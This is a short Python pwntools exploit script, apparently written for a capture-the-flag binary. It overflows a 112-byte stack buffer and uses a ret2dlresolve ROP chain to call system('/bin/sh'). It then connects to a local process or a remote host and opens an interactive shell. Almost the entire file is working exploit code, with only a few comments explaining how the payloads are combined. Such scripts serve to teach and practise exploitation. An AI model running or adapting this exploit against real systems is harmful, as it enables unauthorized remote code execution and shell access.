from pwn import *

g_fname = args.FNAME
context.binary = g_elf = ELF(g_fname)
dlresolve = Ret2dlresolvePayload(g_elf, symbol="system", args=["/bin/sh"])
rop = ROP(g_elf)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
first_read_payload = rop.chain()
padding_bof_len = 112
first_read_len = 0x100
# There combine 2 read()'s content together:
# 1st read() is the orignal read with buffer-overflow, and its buf[] len is 112 bytes.
# 2nd read() is what we ROP to read dlresolve.payload to dlresolve.data_addr
# It's definitely OK to send 2 payloads separately!!
payload = flat({padding_bof_len:first_read_payload, first_read_len:dlresolve.payload})

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.REMOTE.split(':')
	g_io = remote(h, p)

g_io.send(payload)
g_io.interactive()
